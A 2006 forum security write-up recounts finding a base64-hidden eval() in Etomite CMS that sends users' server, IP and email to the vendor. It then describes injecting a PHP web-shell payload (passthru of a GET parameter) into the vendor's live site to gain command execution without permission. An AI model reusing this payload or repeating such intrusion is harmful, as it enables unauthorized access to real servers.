1 About this paper

The following paper was written to allow curious readers to
fully understand my mystery pertaining to a random discovery
within Etomite.org and the CMS software they distribute. The
reason that i wrote this, was because of the fact that the
bug itself was not within the CMS, but found randomly in
the vendor website through their modified version of the
CMS.

2 My curiosity

My purpose was just to look for vulnerabilities. It is at
the moment January 10 2006. I had to choose which CMS i
wanted to audit. At random, i chose Etomite CMS. Unlike
the other CMS sytems, Etomite&#39;s was quite confusing. Not
the PHP itself, but the fact that its functions were within
functions within functions, and their use of a cache system.
Not to mention a large amount of base64 encoded functions and
such.

I was just looking through various files, until i stumbled
on a file containing a small amount of base64 code. It is
my instinct to of course decode the base64 using a simple
online base64 decoder.

File: &#39;manager/includes/settings.inc.php&#39;

++ Base64 Encoded ++
eval(base64_decode(&quot;ZWNobyAiPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFz

ImZ1bGxfYXBwbmFtZSJdKS4iJzs8L3NjcmlwdD4iOw==&quot;));

++ Base64 Decoded ++
echo &quot;&lt;script type=&#39;text/javascript&#39;&gt;
top.document.location.href=&#39;http://www.etomite.org/license?
s=&quot;.base64_encode($_SERVER[&#39;SERVER_NAME&#39;]).&quot;
&amp;i=&quot;.base64_encode($_SESSION[&#39;ip&#39;]).&quot;
&amp;e=&quot;.base64_encode($_SESSION[&#39;email&#39;]).&quot;
&amp;cs1=&quot;.$_SESSION[&#39;valid&#39;].&quot;&amp;cs2=&quot;.$_SESSION[&#39;user&#39;].&quot;
&amp;cs3=&quot;.base64_encode($GLOBALS[&quot;full_appname&quot;]).&quot;&#39;;
&lt;/script&gt;&quot;;

This led me to believe that the CMS basically logged their
downloaders/users for their servers hostname, the persons IP
address, email address, username, and name/version of the CMS
they were using.

As a joke, i decided to visit the page with my own values in
the variables. I set the &#39;s&#39; variable with the following
to attempt to create an SQL error if possible:

&#39; OR &#39;a&#39;=&#39;a&#39;

The other variables, i had just set their values to 1. After
setting them and viewing the page, i realized that i had
forgotten to base64 encode my input. To further advance my
joke, i encoded the following in base64:

++ Base64 Decoded ++
&lt;?passthru($_GET[cmd]);die();?&gt;

++ Base64 Encoded ++
PD9wYXNzdGhydSgkX0dFVFtjbWRdKTtkaWUoKTs/Pg==

After filling in every variable except &#39;s&#39; with my base64
encoded PHP code, to my surprise, i had encountered the
following error on the page:

PHP error debug
Error: passthru(): Cannot execute a blank command
Error type/ Nr.: Warning - 2
File: /home/xxx/public_html/index.php(414) : eval()&#39;d code
Line: 22

Mitä vittua??? Did it just say what i think it just said...
Indeed, it apparently tried to execute a command using my
encoded PHP code. But how? Is this even a bug within the CMS?
I kept asking myself questions and then decided to write a
small exploit in Perl against this bug. It was to be used
only against the CMS website (PoC will be included at the end
of this paper).

After getting inside, i tried to just look through all their
PHP files to see if i could figure out _why_ it did what it
did. So i looked.

3 The vulnerable code

After looking at it for around 45 minutes, i began getting a
bit annoyed. I had to traceback function after function and
then finally came across one function which had something
interesting:

function outputContent() {
...
// Check to see if document content contains PHP tags.
// PHP tag support contributed by SniperX
if( (preg_match(&quot;/(&lt;?php|&lt;?)(.*?)?&gt;/&quot;, $documentOutput))
&amp;&amp; ($type == &quot;text/html&quot;) &amp;&amp; ($this-&gt;allow_embedded_php) )
{
$documentOutput = &#39;?&#39;.&#39;&gt;&#39; . $documentOutput . &#39;&lt;&#39;.&#39;?php &#39;;
// Parse the PHP tags.
eval($documentOutput);
}
...

Do you see it? Through all of the functions, it came down to
the value of $documentOutput (which was the base64 encoded
data i passed through each variable). These variables were
apparently also sent through a MySQL query, which i figured
out after decoding more base64 data. This is why i got the
MySQL errors. But, in order to trigger the command execution,
i had to create an error. This led me back and forth until i
realized that it was &#39;outputContent&#39; which was the problem.

Any person fluent in PHP knows of the eval() function. It
basically evaluates PHP code. In other words, doing the
following will execute the PHP code as if they were between
the angled brackets (&lt;? and ?&gt;)

eval(&quot;passthru(&#39;id&#39;);&quot;);

This led me to believe that it was the eval() call in the
outputContent function that had made my code get executed. I
did not realize that it was the problem, because of the fact
i had used angled brackets in my query. I overlooked the code
where outputContent parses out the angled brackets. I thank
my friend ReZEN for showing that out for me. I was focused on
eval(), haha.

Before i conclude this paper, i have not concluded whether or
not the actual distributable CMS is vulnerable to this. It
may or may not be, but i will let other people do that work
or maybe i will do that in the distant future.[br][size=1]Posted at: September 09, 2006, 09:26:02 AM[/size][hr]4 Greets

ReZEN (http://www.xorcrew.net)
for pointing out the PHP code which parsed out the angled
brackets, which led to the conclusion of why the PHP code was
able to get parsed by eval().
